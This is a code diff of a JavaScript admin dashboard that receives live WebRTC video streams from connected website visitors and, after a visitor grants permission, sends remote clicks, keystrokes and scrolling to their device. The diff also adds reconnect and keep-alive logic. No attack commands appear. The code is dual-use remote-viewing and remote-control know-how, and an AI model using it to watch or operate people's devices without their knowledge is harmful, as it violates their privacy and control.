@@ -4,55 +4,58 @@ const visitors = new Map();
 const streams = new Map();
 const pendingCandidates = new Map();
 const controlledVisitors = new Set();
-const iceServers = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
+const iceServers = { iceServers: [{ urls: "stun:stun.l.google.com:19302" }] };
 let currentModalId = null;
-let currentFilter = 'all';
+let currentFilter = "all";
 let activeControlId = null;
 let deleteTargetId = null;
 let currentPassword = null;
+let reconnectInterval = null;
+let pingInterval = null;
 
-document.getElementById('login-btn').addEventListener('click', () => {
-    const pass = document.getElementById('admin-password').value;
-    if (!pass) return;
-    
-    // Request notification permission on user gesture (browser requirement)
-    if ("Notification" in window && Notification.permission === "default") {
-        Notification.requestPermission();
-    }
+document.getElementById("login-btn").addEventListener("click", () => {
+  const pass = document.getElementById("admin-password").value;
+  if (!pass) return;
 
-    document.getElementById('login-error').textContent = '';
-    initWS(pass);
+  if ("Notification" in window && Notification.permission === "default") {
+    Notification.requestPermission();
+  }
+
+  document.getElementById("login-error").textContent = "";
+  initWS(pass);
 });
-document.getElementById('admin-password').addEventListener('keypress', (e) => {
-    if (e.key === 'Enter') document.getElementById('login-btn').click();
+document.getElementById("admin-password").addEventListener("keypress", (e) => {
+  if (e.key === "Enter") document.getElementById("login-btn").click();
 });
 
 // ---------- ACTIVE DEVICE COUNT (DRAGGABLE) ----------
 function updateActiveCount() {
-    const online = Array.from(visitors.values()).filter(v => v.status === 'online').length;
-    const total = visitors.size;
+  const online = Array.from(visitors.values()).filter(
+    (v) => v.status === "online",
+  ).length;
+  const total = visitors.size;
 
-    let badge = document.getElementById('active-device-count');
-    if (!badge) {
-        if (!document.getElementById('pulse-anim-style')) {
-            const style = document.createElement('style');
-            style.id = 'pulse-anim-style';
-            style.textContent = `
+  let badge = document.getElementById("active-device-count");
+  if (!badge) {
+    if (!document.getElementById("pulse-anim-style")) {
+      const style = document.createElement("style");
+      style.id = "pulse-anim-style";
+      style.textContent = `
                 @keyframes pulse {
                     0%, 100% { opacity: 1; transform: scale(1); }
                     50% { opacity: 0.5; transform: scale(1.3); }
                 }
             `;
-            document.head.appendChild(style);
-        }
+      document.head.appendChild(style);
+    }
 
-        badge = document.createElement('div');
-        badge.id = 'active-device-count';
-        
-        const savedX = localStorage.getItem('sms-badge-x');
-        const savedY = localStorage.getItem('sms-badge-y');
+    badge = document.createElement("div");
+    badge.id = "active-device-count";
 
-        badge.style.cssText = `
+    const savedX = localStorage.getItem("sms-badge-x");
+    const savedY = localStorage.getItem("sms-badge-y");
+
+    badge.style.cssText = `
             position: fixed;
             ${savedX && savedY ? `left: ${savedX}px; top: ${savedY}px;` : `bottom: 24px; left: 24px;`}
             background: var(--success, #10b981);
@@ -71,95 +74,56 @@ function updateActiveCount() {
             touch-action: none;
             font-family: inherit;
         `;
-        document.body.appendChild(badge);
+    document.body.appendChild(badge);
 
-        let isDragging = false;
-        let startX, startY, initialLeft, initialTop;
+    let isDragging = false;
+    let startX, startY, initialLeft, initialTop;
 
-        badge.addEventListener('mousedown', (e) => {
-            isDragging = true;
-            badge.style.cursor = 'grabbing';
-            
-            const rect = badge.getBoundingClientRect();
-            badge.style.bottom = 'auto';
-            badge.style.right = 'auto';
-            badge.style.left = rect.left + 'px';
-            badge.style.top = rect.top + 'px';
+    badge.addEventListener("mousedown", (e) => {
+      isDragging = true;
+      badge.style.cursor = "grabbing";
 
-            startX = e.clientX;
-            startY = e.clientY;
-            initialLeft = rect.left;
-            initialTop = rect.top;
-            e.preventDefault();
-        });
+      const rect = badge.getBoundingClientRect();
+      badge.style.bottom = "auto";
+      badge.style.right = "auto";
+      badge.style.left = rect.left + "px";
+      badge.style.top = rect.top + "px";
 
-        document.addEventListener('mousemove', (e) => {
-            if (!isDragging) return;
-            const dx = e.clientX - startX;
-            const dy = e.clientY - startY;
-            
-            let newLeft = initialLeft + dx;
-            let newTop = initialTop + dy;
+      startX = e.clientX;
+      startY = e.clientY;
+      initialLeft = rect.left;
+      initialTop = rect.top;
+      e.preventDefault();
+    });
 
-            const rect = badge.getBoundingClientRect();
-            newLeft = Math.max(0, Math.min(newLeft, window.innerWidth - rect.width));
-            newTop = Math.max(0, Math.min(newTop, window.innerHeight - rect.height));
+    document.addEventListener("mousemove", (e) => {
+      if (!isDragging) return;
+      const dx = e.clientX - startX;
+      const dy = e.clientY - startY;
 
-            badge.style.left = newLeft + 'px';
-            badge.style.top = newTop + 'px';
-        });
+      let newLeft = initialLeft + dx;
+      let newTop = initialTop + dy;
 
-        document.addEventListener('mouseup', () => {
-            if (!isDragging) return;
-            isDragging = false;
-            badge.style.cursor = 'grab';
-            
-            const rect = badge.getBoundingClientRect();
-            localStorage.setItem('sms-badge-x', rect.left);
-            localStorage.setItem('sms-badge-y', rect.top);
-        });
+      const rect = badge.getBoundingClientRect();
+      newLeft = Math.max(0, Math.min(newLeft, window.innerWidth - rect.width));
+      newTop = Math.max(0, Math.min(newTop, window.innerHeight - rect.height));
 
-        badge.addEventListener('touchstart', (e) => {
-            isDragging = true;
-            const rect = badge.getBoundingClientRect();
-            badge.style.bottom = 'auto';
-            badge.style.right = 'auto';
-            badge.style.left = rect.left + 'px';
-            badge.style.top = rect.top + 'px';
-            
-            startX = e.touches[0].clientX;
-            startY = e.touches[0].clientY;
-            initialLeft = rect.left;
-            initialTop = rect.top;
-        }, { passive: true });
+      badge.style.left = newLeft + "px";
+      badge.style.top = newTop + "px";
+    });
 
-        document.addEventListener('touchmove', (e) => {
-            if (!isDragging) return;
-            const dx = e.touches[0].clientX - startX;
-            const dy = e.touches[0].clientY - startY;
-            
-            let newLeft = initialLeft + dx;
-            let newTop = initialTop + dy;
-            
-            const rect = badge.getBoundingClientRect();
-            newLeft = Math.max(0, Math.min(newLeft, window.innerWidth - rect.width));
-            newTop = Math.max(0, Math.min(newTop, window.innerHeight - rect.height));
+    document.addEventListener("mouseup", () => {
+      if (!isDragging) return;
+      isDragging = false;
+      badge.style.cursor = "grab";
 
-            badge.style.left = newLeft + 'px';
-            badge.style.top = newTop + 'px';
-        }, { passive: true });
+      const rect = badge.getBoundingClientRect();
+      localStorage.setItem("sms-badge-x", rect.left);
+      localStorage.setItem("sms-badge-y", rect.top);
+    });
+  }
 
-        document.addEventListener('touchend', () => {
-            if (!isDragging) return;
-            isDragging = false;
-            
-            const rect = badge.getBoundingClientRect();
-            localStorage.setItem('sms-badge-x', rect.left);
-            localStorage.setItem('sms-badge-y', rect.top);
-        });
-    }
-
-    badge.innerHTML = `
+  badge.innerHTML = `
         <span style="width:8px;height:8px;background:white;border-radius:50%;display:inline-block;animation:pulse 1.2s infinite; pointer-events: none;"></span>
         <span style="pointer-events: none;">${online} active / ${total} total</span>
     `;
@@ -167,372 +131,525 @@ function updateActiveCount() {
 
 // ---------- DESKTOP NOTIFICATIONS ----------
 function showDesktopNotification(visitorId, userAgent) {
-    if (!("Notification" in window)) return;
-    
-    const options = {
-        body: `ID: ${visitorId} (${parseUserAgent(userAgent)})`,
-        tag: 'visitor-alert',
-        renotify: true,
-        requireInteraction: true
-    };
+  if (!("Notification" in window)) return;
 
-    if (Notification.permission === "granted") {
-        // Fires regardless of whether the tab is in the background or foreground
-        const notification = new Notification("New Visitor Connected", options);
-        notification.onclick = function() {
-            window.focus();
-            this.close();
-        };
-    } else if (Notification.permission === "default") {
-        // If permission hasn't been granted yet, force a prompt
-        Notification.requestPermission().then(perm => {
-            if (perm === "granted") {
-                new Notification("New Visitor Connected", options);
-            }
-        });
-    } else {
-        // If blocked by the browser, show a hard alert so you don't miss it
-        setTimeout(() => {
-            alert(`NEW VISITOR CONNECTED\n\nID: ${visitorId}\nDevice: ${parseUserAgent(userAgent)}`);
-        }, 100);
-    }
+  const options = {
+    body: `ID: ${visitorId} (${parseUserAgent(userAgent)})`,
+    tag: "visitor-alert",
+    renotify: true,
+    requireInteraction: true,
+  };
+
+  if (Notification.permission === "granted") {
+    const notification = new Notification("New Visitor Connected", options);
+    notification.onclick = function () {
+      window.focus();
+      this.close();
+    };
+  } else if (Notification.permission === "default") {
+    Notification.requestPermission().then((perm) => {
+      if (perm === "granted") {
+        new Notification("New Visitor Connected", options);
+      }
+    });
+  } else {
+    setTimeout(() => {
+      alert(
+        `NEW VISITOR CONNECTED\n\nID: ${visitorId}\nDevice: ${parseUserAgent(userAgent)}`,
+      );
+    }, 100);
+  }
 }
 
 // ---------- PERSISTENCE & SESSION ----------
 function initWS(password) {
-    currentPassword = password;
-    try { sessionStorage.setItem('adminPass', password); } catch(e) {}
+  currentPassword = password;
+  try {
+    sessionStorage.setItem("adminPass", password);
+  } catch (e) {}
 
-    if (ws) {
-        ws.onclose = null; ws.onmessage = null; ws.onerror = null; ws.onopen = null;
-        try { ws.close(); } catch(e) {}
+  if (ws) {
+    ws.onclose = null;
+    ws.onmessage = null;
+    ws.onerror = null;
+    ws.onopen = null;
+    try {
+      ws.close();
+    } catch (e) {}
+  }
+
+  if (reconnectInterval) clearInterval(reconnectInterval);
+  if (pingInterval) clearInterval(pingInterval);
+
+  const protocol = window.location.protocol === "https:" ? "wss://" : "ws://";
+  const newWs = new WebSocket(`${protocol}${window.location.host}`);
+  ws = newWs;
+
+  newWs.onopen = () => {
+    newWs.send(JSON.stringify({ type: "role", role: "admin", password }));
+
+    // Keep the connection alive by sending a ping every 15 seconds
+    pingInterval = setInterval(() => {
+      if (ws && ws.readyState === WebSocket.OPEN) {
+        ws.send(JSON.stringify({ type: "ping" }));
+      }
+    }, 15000);
+  };
+
+  newWs.onmessage = async (e) => {
+    if (ws !== newWs) return;
+    const data = JSON.parse(e.data);
+
+    if (data.type === "auth-failed") {
+      document.getElementById("login-error").textContent =
+        data.message || "Invalid password";
+      try {
+        sessionStorage.removeItem("adminPass");
+      } catch (e) {}
+      currentPassword = null;
+      return;
+    }
+    if (data.type === "init") {
+      document.getElementById("login-screen").classList.remove("active");
+      document.getElementById("dashboard-screen").classList.add("active");
+      document.querySelectorAll(".tile").forEach((t) => t.remove());
+      visitors.clear();
+      data.visitors.forEach((v) => {
+        addOrUpdateVisitor(v);
+        // Ask online visitors for a new stream so the video reconnects
+        if (v.status === "online") {
+          ws.send(JSON.stringify({ type: "request-offer", target: v.id }));
+        }
+      });
+      toggleEmptyState();
+      updateActiveCount();
+      return;
+    }
+    if (data.type === "visitor-connected") {
+      addOrUpdateVisitor(data.visitor);
+      playBeep();
+      showAdminToast(data.visitor.id.split("-")[0], data.visitor.userAgent);
+      showDesktopNotification(
+        data.visitor.id.split("-")[0],
+        data.visitor.userAgent,
+      );
+      toggleEmptyState();
+      updateActiveCount();
+      return;
+    }
+    if (data.type === "visitor-disconnected") {
+      const v = visitors.get(data.id);
+      if (v) {
+        v.status = "offline";
+        addOrUpdateVisitor(v);
+      }
+      updateActiveCount();
+    }
+    if (data.type === "visitor-removed") {
+      visitors.delete(data.id);
+      streams.delete(data.id);
+      controlledVisitors.delete(data.id);
+      if (activeControlId === data.id) stopTyping();
+      const tile = document.getElementById(`tile-${data.id}`);
+      if (tile) tile.remove();
+      if (peerConnections.has(data.id)) {
+        peerConnections.get(data.id).close();
+        peerConnections.delete(data.id);
+      }
+      toggleEmptyState();
+      applyFilter();
+      updateActiveCount();
+    }
+    if (data.type === "visitor-updated") {
+      addOrUpdateVisitor(data.visitor);
+      updateActiveCount();
     }
 
-    const protocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
-    const newWs = new WebSocket(`${protocol}${window.location.host}`);
-    ws = newWs;
+    if (data.type === "control-granted") {
+      if (!controlledVisitors.has(data.sender)) {
+        showAdminToast("Access Granted", "Click the video feed to type/click.");
+      }
+      controlledVisitors.add(data.sender);
+      updateControlBtn(data.sender, true);
+    }
+    if (data.type === "control-denied") {
+      showAdminToast("Access Denied", "The visitor rejected remote control.");
+      updateControlBtn(data.sender, false);
+    }
 
-    newWs.onopen = () => newWs.send(JSON.stringify({ type: 'role', role: 'admin', password }));
+    if (data.type === "webrtc-offer") {
+      const visitorId = data.sender;
+      if (peerConnections.has(visitorId))
+        peerConnections.get(visitorId).close();
+      const pc = new RTCPeerConnection(iceServers);
+      peerConnections.set(visitorId, pc);
+      pc.onicecandidate = (event) => {
+        if (event.candidate)
+          ws.send(
+            JSON.stringify({
+              type: "webrtc-ice",
+              candidate: event.candidate,
+              target: visitorId,
+            }),
+          );
+      };
+      pc.ontrack = (event) => {
+        const stream = event.streams[0] || new MediaStream([event.track]);
+        streams.set(visitorId, stream);
+        const video = document.getElementById(`video-${visitorId}`);
+        if (video) {
+          video.srcObject = stream;
+          video.play().catch((err) => console.log("Play blocked", err));
+        }
+      };
+      await pc.setRemoteDescription(new RTCSessionDescription(data.sdp));
+      if (pendingCandidates.has(visitorId)) {
+        for (const cand of pendingCandidates.get(visitorId)) {
+          try {
+            await pc.addIceCandidate(new RTCIceCandidate(cand));
+          } catch (err) {}
+        }
+        pendingCandidates.delete(visitorId);
+      }
+      const answer = await pc.createAnswer();
+      await pc.setLocalDescription(answer);
+      ws.send(
+        JSON.stringify({
+          type: "webrtc-answer",
+          sdp: answer,
+          target: visitorId,
+        }),
+      );
+    }
 
-    newWs.onmessage = async (e) => {
-        if (ws !== newWs) return;
-        const data = JSON.parse(e.data);
+    if (data.type === "webrtc-ice") {
+      const visitorId = data.sender;
+      const pc = peerConnections.get(visitorId);
+      if (pc && pc.remoteDescription) {
+        try {
+          await pc.addIceCandidate(new RTCIceCandidate(data.candidate));
+        } catch (err) {}
+      } else {
+        if (!pendingCandidates.has(visitorId))
+          pendingCandidates.set(visitorId, []);
+        pendingCandidates.get(visitorId).push(data.candidate);
+      }
+    }
+  };
 
-        if (data.type === 'auth-failed') {
-            document.getElementById('login-error').textContent = data.message || 'Invalid password';
-            try { sessionStorage.removeItem('adminPass'); } catch(e) {}
-            currentPassword = null;
-            return;
-        }
-        if (data.type === 'init') {
-            document.getElementById('login-screen').classList.remove('active');
-            document.getElementById('dashboard-screen').classList.add('active');
-            document.querySelectorAll('.tile').forEach(t => t.remove());
-            visitors.clear();
-            data.visitors.forEach(v => addOrUpdateVisitor(v));
-            toggleEmptyState();
-            updateActiveCount();
-            return;
-        }
-        if (data.type === 'visitor-connected') {
-            addOrUpdateVisitor(data.visitor);
-            playBeep();
-            showAdminToast(data.visitor.id.split('-')[0], data.visitor.userAgent);
-            showDesktopNotification(data.visitor.id.split('-')[0], data.visitor.userAgent); // Fired here
-            toggleEmptyState();
-            updateActiveCount();
-            return;
-        }
-        if (data.type === 'visitor-disconnected') {
-            const v = visitors.get(data.id);
-            if (v) { v.status = 'offline'; addOrUpdateVisitor(v); }
-            updateActiveCount();
-        }
-        if (data.type === 'visitor-removed') {
-            visitors.delete(data.id);
-            streams.delete(data.id);
-            controlledVisitors.delete(data.id);
-            if (activeControlId === data.id) stopTyping();
-            const tile = document.getElementById(`tile-${data.id}`);
-            if (tile) tile.remove();
-            if (peerConnections.has(data.id)) {
-                peerConnections.get(data.id).close();
-                peerConnections.delete(data.id);
-            }
-            toggleEmptyState();
-            applyFilter();
-            updateActiveCount();
-        }
-        if (data.type === 'visitor-updated') {
-            addOrUpdateVisitor(data.visitor);
-            updateActiveCount();
-        }
+  // Auto-Reconnect logic if the socket drops
+  newWs.onclose = () => {
+    if (reconnectInterval) clearInterval(reconnectInterval);
+    if (pingInterval) clearInterval(pingInterval);
 
-        if (data.type === 'control-granted') {
-            controlledVisitors.add(data.sender);
-            showAdminToast("Access Granted", "Click the video feed to type/click.");
-            updateControlBtn(data.sender, true);
-        }
-        if (data.type === 'control-denied') {
-            showAdminToast("Access Denied", "The visitor rejected remote control.");
-            updateControlBtn(data.sender, false);
-        }
+    if (currentPassword) {
+      showAdminToast("Connection Lost", "Reconnecting...");
+      reconnectInterval = setInterval(() => {
+        initWS(currentPassword);
+      }, 3000);
+    }
+  };
 
-        if (data.type === 'webrtc-offer') {
-            const visitorId = data.sender;
-            if (peerConnections.has(visitorId)) peerConnections.get(visitorId).close();
-            const pc = new RTCPeerConnection(iceServers);
-            peerConnections.set(visitorId, pc);
-            pc.onicecandidate = (event) => {
-                if (event.candidate) ws.send(JSON.stringify({ type: 'webrtc-ice', candidate: event.candidate, target: visitorId }));
-            };
-            pc.ontrack = (event) => {
-                const stream = event.streams[0] || new MediaStream([event.track]);
-                streams.set(visitorId, stream);
-                const video = document.getElementById(`video-${visitorId}`);
-                if (video) { video.srcObject = stream; video.play().catch(err => console.log("Play blocked", err)); }
-            };
-            await pc.setRemoteDescription(new RTCSessionDescription(data.sdp));
-            if (pendingCandidates.has(visitorId)) {
-                for (const cand of pendingCandidates.get(visitorId)) {
-                    try { await pc.addIceCandidate(new RTCIceCandidate(cand)); } catch (err) {}
-                }
-                pendingCandidates.delete(visitorId);
-            }
-            const answer = await pc.createAnswer();
-            await pc.setLocalDescription(answer);
-            ws.send(JSON.stringify({ type: 'webrtc-answer', sdp: answer, target: visitorId }));
-        }
-
-        if (data.type === 'webrtc-ice') {
-            const visitorId = data.sender;
-            const pc = peerConnections.get(visitorId);
-            if (pc && pc.remoteDescription) {
-                try { await pc.addIceCandidate(new RTCIceCandidate(data.candidate)); } catch(err) {}
-            } else {
-                if (!pendingCandidates.has(visitorId)) pendingCandidates.set(visitorId, []);
-                pendingCandidates.get(visitorId).push(data.candidate);
-            }
-        }
-    };
-    newWs.onclose = () => {};
+  newWs.onerror = () => {
+    try {
+      newWs.close();
+    } catch (e) {}
+  };
 }
 
-window.addEventListener('load', () => {
-    let savedPass = null;
-    try { savedPass = sessionStorage.getItem('adminPass'); } catch(e) {}
-
-    if (savedPass) {
-        document.getElementById('login-error').textContent = 'Reconnecting...';
-        document.getElementById('login-error').style.color = 'var(--text-muted)';
-        initWS(savedPass);
-    } else {
-        document.getElementById('login-screen').classList.add('active');
-        document.getElementById('dashboard-screen').classList.remove('active');
-        document.getElementById('login-error').textContent = '';
+// Re-sync connection instantly if you return to the tab after a long time
+document.addEventListener("visibilitychange", () => {
+  if (document.visibilityState === "visible" && currentPassword) {
+    if (
+      !ws ||
+      ws.readyState === WebSocket.CLOSED ||
+      ws.readyState === WebSocket.CLOSING
+    ) {
+      initWS(currentPassword);
     }
+  }
+});
 
-    updateActiveCount();
+window.addEventListener("load", () => {
+  let savedPass = null;
+  try {
+    savedPass = sessionStorage.getItem("adminPass");
+  } catch (e) {}
+
+  if (savedPass) {
+    document.getElementById("login-error").textContent = "Reconnecting...";
+    document.getElementById("login-error").style.color = "var(--text-muted)";
+    initWS(savedPass);
+  } else {
+    document.getElementById("login-screen").classList.add("active");
+    document.getElementById("dashboard-screen").classList.remove("active");
+    document.getElementById("login-error").textContent = "";
+  }
+
+  updateActiveCount();
 });
 
 function refreshDashboard() {
-    const btn = document.getElementById('refresh-btn');
-    btn.classList.add('spinning');
-    btn.disabled = true;
+  const btn = document.getElementById("refresh-btn");
+  btn.classList.add("spinning");
+  btn.disabled = true;
 
-    visitors.clear(); streams.clear(); controlledVisitors.clear(); pendingCandidates.clear();
-    peerConnections.forEach(pc => { try { pc.close(); } catch(e) {} });
-    peerConnections.clear();
-    document.querySelectorAll('.tile').forEach(t => t.remove());
-    toggleEmptyState();
-    updateActiveCount();
+  visitors.clear();
+  streams.clear();
+  controlledVisitors.clear();
+  pendingCandidates.clear();
+  peerConnections.forEach((pc) => {
+    try {
+      pc.close();
+    } catch (e) {}
+  });
+  peerConnections.clear();
+  document.querySelectorAll(".tile").forEach((t) => t.remove());
+  toggleEmptyState();
+  updateActiveCount();
 
-    if (currentPassword) initWS(currentPassword);
-    else {
-        let saved = null;
-        try { saved = sessionStorage.getItem('adminPass'); } catch(e) {}
-        if (saved) initWS(saved);
-    }
+  if (currentPassword) initWS(currentPassword);
+  else {
+    let saved = null;
+    try {
+      saved = sessionStorage.getItem("adminPass");
+    } catch (e) {}
+    if (saved) initWS(saved);
+  }
 
-    setTimeout(() => {
-        btn.classList.remove('spinning');
-        btn.disabled = false;
-        showAdminToast("Refreshed", "Dashboard synced with server.");
-    }, 800);
+  setTimeout(() => {
+    btn.classList.remove("spinning");
+    btn.disabled = false;
+    showAdminToast("Refreshed", "Dashboard synced with server.");
+  }, 800);
 }
 
 function signOut() {
-    try { sessionStorage.removeItem('adminPass'); } catch(e) {}
-    currentPassword = null;
+  try {
+    sessionStorage.removeItem("adminPass");
+  } catch (e) {}
+  currentPassword = null;
 
-    if (ws) {
-        ws.onclose = null; ws.onmessage = null; ws.onerror = null; ws.onopen = null;
-        try { ws.close(); } catch(e) {}
-    }
+  if (reconnectInterval) clearInterval(reconnectInterval);
+  if (pingInterval) clearInterval(pingInterval);
 
-    visitors.clear(); streams.clear(); controlledVisitors.clear(); pendingCandidates.clear();
-    peerConnections.forEach(pc => { try { pc.close(); } catch(e) {} });
-    peerConnections.clear();
-    document.querySelectorAll('.tile').forEach(t => t.remove());
-    toggleEmptyState();
-    updateActiveCount();
+  if (ws) {
+    ws.onclose = null;
+    ws.onmessage = null;
+    ws.onerror = null;
+    ws.onopen = null;
+    try {
+      ws.close();
+    } catch (e) {}
+  }
 
-    document.getElementById('dashboard-screen').classList.remove('active');
-    document.getElementById('login-screen').classList.add('active');
-    document.getElementById('admin-password').value = '';
-    document.getElementById('login-error').textContent = '';
-    document.getElementById('login-error').style.color = 'var(--danger)';
+  visitors.clear();
+  streams.clear();
+  controlledVisitors.clear();
+  pendingCandidates.clear();
+  peerConnections.forEach((pc) => {
+    try {
+      pc.close();
+    } catch (e) {}
+  });
+  peerConnections.clear();
+  document.querySelectorAll(".tile").forEach((t) => t.remove());
+  toggleEmptyState();
+  updateActiveCount();
+
+  document.getElementById("dashboard-screen").classList.remove("active");
+  document.getElementById("login-screen").classList.add("active");
+  document.getElementById("admin-password").value = "";
+  document.getElementById("login-error").textContent = "";
+  document.getElementById("login-error").style.color = "var(--danger)";
 }
 
 // ---------- REMOTE CONTROL ----------
 function requestControl(id) {
-    ws.send(JSON.stringify({ type: 'request-control', target: id }));
+  ws.send(JSON.stringify({ type: "request-control", target: id }));
 }
 
 function handleRemoteClick(e, id) {
-    if (!controlledVisitors.has(id)) return;
-    startTyping(id);
+  if (!controlledVisitors.has(id)) return;
+  startTyping(id);
 
-    const video = document.getElementById(`video-${id}`);
-    if (!video) return;
+  const video = document.getElementById(`video-${id}`);
+  if (!video) return;
 
-    const rect = video.getBoundingClientRect();
-    const videoRatio = video.videoWidth / video.videoHeight;
-    const rectRatio = rect.width / rect.height;
-    let renderWidth, renderHeight, offsetX, offsetY;
+  const rect = video.getBoundingClientRect();
+  const videoRatio = video.videoWidth / video.videoHeight;
+  const rectRatio = rect.width / rect.height;
+  let renderWidth, renderHeight, offsetX, offsetY;
 
-    if (rectRatio > videoRatio) {
-        renderHeight = rect.height;
-        renderWidth = videoRatio * renderHeight;
-        offsetX = (rect.width - renderWidth) / 2;
-        offsetY = 0;
-    } else {
-        renderWidth = rect.width;
-        renderHeight = renderWidth / videoRatio;
-        offsetX = 0;
-        offsetY = (rect.height - renderHeight) / 2;
-    }
+  if (rectRatio > videoRatio) {
+    renderHeight = rect.height;
+    renderWidth = videoRatio * renderHeight;
+    offsetX = (rect.width - renderWidth) / 2;
+    offsetY = 0;
+  } else {
+    renderWidth = rect.width;
+    renderHeight = renderWidth / videoRatio;
+    offsetX = 0;
+    offsetY = (rect.height - renderHeight) / 2;
+  }
 
-    const clickX = e.clientX - rect.left - offsetX;
-    const clickY = e.clientY - rect.top - offsetY;
-    if (clickX < 0 || clickX > renderWidth || clickY < 0 || clickY > renderHeight) return;
+  const clickX = e.clientX - rect.left - offsetX;
+  const clickY = e.clientY - rect.top - offsetY;
+  if (clickX < 0 || clickX > renderWidth || clickY < 0 || clickY > renderHeight)
+    return;
 
-    ws.send(JSON.stringify({ type: 'remote-click', target: id, x: clickX / renderWidth, y: clickY / renderHeight }));
+  ws.send(
+    JSON.stringify({
+      type: "remote-click",
+      target: id,
+      x: clickX / renderWidth,
+      y: clickY / renderHeight,
+    }),
+  );
 
-    const ripple = document.createElement('div');
-    ripple.style.cssText = `position:absolute; left:${e.clientX - rect.left}px; top:${e.clientY - rect.top}px; width:20px; height:20px; background:rgba(239, 68, 68, 0.5); border-radius:50%; transform:translate(-50%,-50%); pointer-events:none; animation:ripple 0.5s ease-out forwards; z-index:10;`;
-    video.parentElement.appendChild(ripple);
-    setTimeout(() => ripple.remove(), 500);
+  const ripple = document.createElement("div");
+  ripple.style.cssText = `position:absolute; left:${e.clientX - rect.left}px; top:${e.clientY - rect.top}px; width:20px; height:20px; background:rgba(239, 68, 68, 0.5); border-radius:50%; transform:translate(-50%,-50%); pointer-events:none; animation:ripple 0.5s ease-out forwards; z-index:10;`;
+  video.parentElement.appendChild(ripple);
+  setTimeout(() => ripple.remove(), 500);
 }
 
 function startTyping(id) {
-    activeControlId = id;
-    const capture = document.getElementById('remote-keyboard-capture');
-    capture.value = '';
-    capture.focus();
-    showTypingIndicator(true, id);
+  activeControlId = id;
+  const capture = document.getElementById("remote-keyboard-capture");
+  capture.value = "";
+  capture.focus();
+  showTypingIndicator(true, id);
 }
 
 function stopTyping() {
-    activeControlId = null;
-    document.getElementById('remote-keyboard-capture').blur();
-    showTypingIndicator(false);
+  activeControlId = null;
+  document.getElementById("remote-keyboard-capture").blur();
+  showTypingIndicator(false);
 }
 
 function showTypingIndicator(show, id) {
-    let indicator = document.getElementById('typing-indicator');
-    if (show) {
-        if (!indicator) {
-            indicator = document.createElement('div');
-            indicator.id = 'typing-indicator';
-            indicator.style.cssText = `position:fixed; top:20px; left:50%; transform:translateX(-50%); background:var(--success); color:white; padding:8px 16px; border-radius:20px; font-size:13px; font-weight:600; box-shadow:0 4px 12px rgba(16,185,129,0.4); z-index:99999; display:flex; align-items:center; gap:8px;`;
-            document.body.appendChild(indicator);
-        }
-        indicator.innerHTML = `<span style="width:8px;height:8px;background:white;border-radius:50%;animation:pulse 1s infinite;"></span> Typing to Visitor (click outside to stop)`;
-        indicator.style.display = 'flex';
-    } else if (indicator) {
-        indicator.style.display = 'none';
+  let indicator = document.getElementById("typing-indicator");
+  if (show) {
+    if (!indicator) {
+      indicator = document.createElement("div");
+      indicator.id = "typing-indicator";
+      indicator.style.cssText = `position:fixed; top:20px; left:50%; transform:translateX(-50%); background:var(--success); color:white; padding:8px 16px; border-radius:20px; font-size:13px; font-weight:600; box-shadow:0 4px 12px rgba(16,185,129,0.4); z-index:99999; display:flex; align-items:center; gap:8px;`;
+      document.body.appendChild(indicator);
     }
+    indicator.innerHTML = `<span style="width:8px;height:8px;background:white;border-radius:50%;animation:pulse 1s infinite;"></span> Typing to Visitor (click outside to stop)`;
+    indicator.style.display = "flex";
+  } else if (indicator) {
+    indicator.style.display = "none";
+  }
 }
 
-document.getElementById('remote-keyboard-capture').addEventListener('keydown', (e) => {
+document
+  .getElementById("remote-keyboard-capture")
+  .addEventListener("keydown", (e) => {
     if (!activeControlId) return;
-    if (['Shift', 'Control', 'Alt', 'Meta', 'CapsLock'].includes(e.key)) return;
+    if (["Shift", "Control", "Alt", "Meta", "CapsLock"].includes(e.key)) return;
     e.preventDefault();
-    ws.send(JSON.stringify({ type: 'remote-key', target: activeControlId, key: e.key, code: e.code, ctrlKey: e.ctrlKey, altKey: e.altKey, shiftKey: e.shiftKey, metaKey: e.metaKey }));
+    ws.send(
+      JSON.stringify({
+        type: "remote-key",
+        target: activeControlId,
+        key: e.key,
+        code: e.code,
+        ctrlKey: e.ctrlKey,
+        altKey: e.altKey,
+        shiftKey: e.shiftKey,
+        metaKey: e.metaKey,
+      }),
+    );
+  });
+
+document.addEventListener("click", (e) => {
+  if (!activeControlId) return;
+  const activeVideo = document.getElementById(`video-${activeControlId}`);
+  const modalVideo = document.getElementById(`modal-video-${activeControlId}`);
+  const isClickOnVideo =
+    (activeVideo && activeVideo.contains(e.target)) ||
+    (modalVideo && modalVideo.contains(e.target));
+  if (!isClickOnVideo && e.target.id !== "remote-keyboard-capture") {
+    if (e.target.tagName === "INPUT") stopTyping();
+  }
 });
 
-document.addEventListener('click', (e) => {
-    if (!activeControlId) return;
-    const activeVideo = document.getElementById(`video-${activeControlId}`);
-    const modalVideo = document.getElementById(`modal-video-${activeControlId}`);
-    const isClickOnVideo = (activeVideo && activeVideo.contains(e.target)) || (modalVideo && modalVideo.contains(e.target));
-    if (!isClickOnVideo && e.target.id !== 'remote-keyboard-capture') {
-        if (e.target.tagName === 'INPUT') stopTyping();
-    }
-});
-
-document.addEventListener('wheel', (e) => {
-    if (!activeControlId) return;
-    const video = document.getElementById(`video-${activeControlId}`);
-    if (video && video.contains(e.target)) {
-        ws.send(JSON.stringify({ type: 'remote-scroll', target: activeControlId, deltaY: e.deltaY }));
-    }
+document.addEventListener("wheel", (e) => {
+  if (!activeControlId) return;
+  const video = document.getElementById(`video-${activeControlId}`);
+  if (video && video.contains(e.target)) {
+    ws.send(
+      JSON.stringify({
+        type: "remote-scroll",
+        target: activeControlId,
+        deltaY: e.deltaY,
+      }),
+    );
+  }
 });
 
 function updateControlBtn(id, active) {
-    const btn = document.getElementById(`ctrl-btn-${id}`);
-    if (btn) {
-        if (active) {
-            btn.style.background = 'var(--success)'; btn.style.color = 'white'; btn.style.borderColor = 'var(--success)'; btn.innerText = 'Controlling';
-        } else {
-            btn.style.background = 'transparent'; btn.style.color = 'var(--text)'; btn.style.borderColor = 'var(--border)'; btn.innerText = 'Control';
-        }
+  const btn = document.getElementById(`ctrl-btn-${id}`);
+  if (btn) {
+    if (active) {
+      btn.style.background = "var(--success)";
+      btn.style.color = "white";
+      btn.style.borderColor = "var(--success)";
+      btn.innerText = "Controlling";
+    } else {
+      btn.style.background = "transparent";
+      btn.style.color = "var(--text)";
+      btn.style.borderColor = "var(--border)";
+      btn.innerText = "Control";
